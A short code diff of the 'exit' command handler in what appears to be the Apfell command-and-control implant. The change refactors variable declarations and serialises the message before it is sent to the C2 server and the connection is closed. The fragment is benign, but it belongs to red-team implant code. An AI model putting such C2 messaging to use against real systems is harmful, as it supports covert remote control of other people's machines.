@@ -1,16 +1,16 @@
 exit = function(task) {
-    response = {"task_id":task['task_id'], "user_output":"exiting", "completed": true};
-    outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
-    enc = JSON.stringify(outer_response);
-    final = apfell.apfellid + enc;
-    msg = btoa(unescape(encodeURIComponent(final)));
-    meta = {
+    let response = {"task_id":task.task_id, "user_output":"exiting", "completed": true};
+    let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
+    let enc = JSON.stringify(outer_response);
+    let final = apfell.apfellid + enc;
+    let msg = btoa(unescape(encodeURIComponent(final)));
+    let meta = {
         "data": msg,
         "client": true,
         "tag":"",
     };
-
-    connection.send(meta);
+    let fullmsg = JSON.stringify(meta);
+    connection.send(fullmsg);
     setTimeout(function name(params) {
         connection.close();
     }, C2.interval);
